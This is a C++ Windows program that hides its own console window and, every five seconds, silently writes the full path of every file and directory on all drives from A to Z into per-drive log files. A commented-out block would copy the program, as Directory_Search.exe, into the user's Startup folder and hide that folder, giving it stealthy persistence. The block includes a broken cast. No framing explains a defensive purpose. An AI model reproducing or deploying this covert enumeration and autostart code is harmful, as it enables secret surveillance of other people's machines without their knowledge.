#include <iostream>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <string>
using namespace std;
using namespace filesystem;
void file_search(path file_path, string end_path) {
	ofstream log;
	log.open(end_path, ios::app);
	try{
		for (auto file : directory_iterator{ file_path }) {
			if (file.is_directory()) {
				log << file.path() << endl;
				file_search(file.path(),end_path);
			}
		}
		for (auto file : directory_iterator{ file_path }) {
			if (!file.is_directory()) {log << file.path() << endl;}
		}
	}
	catch (...) { log.close(); }
	log.close();}
int main() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
	//TCHAR szEXEPath[2048];
	//GetModuleFileName(NULL, szEXEPath, 2048);
	//string opath;
	//for (int j = 0; szEXEPath[j] != 0; j++){opath.append(1, char(szEXEPath[j]));}
	//if (opath != string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Directory_Search.exe") {
	//	string cmd = "copy " + opath + " \"" + string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /y/v";
	//	system(cmd.c_str());
	//	system(("\"" + string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Directory_Search.exe\"").c_str());
	//	int attr = GetFileAttributes(LPCWSTR((string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Directory_Search.exe").c_str()));
	//	SetFileAttributes(LPCWSTR((string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup").c_str()), attr | FILE_ATTRIBUTE_HIDDEN);
	//	system("PAUSE");
	//	return 0;}
	while (true){
		for (char i = 'A'; i <= 'Z'; i++) {
			string cmd3 = "dir ";
			cmd3.append(1, i);
			cmd3.append(1, ':');
			if (system(cmd3.c_str())) {continue;}
			string file_path;
			file_path.append(1, i);
			file_path.append(1, ':');
			file_path.append(1, '\\');
			ifstream log;
			string name;
			name.append(1, i);
			log.open(name);
			string fin;
			while (getline(log, fin)) {}
			log.close();
			if (fin == "|||") {continue;}
			ofstream log2;
			log2.open(name, ios::trunc);
			log2.close();
			file_search(file_path, name);
			ofstream log3;
			log3.open(name, ios::app);
			log3 << "|||";
			log3.close();}
		Sleep(5000);}
return 0;}
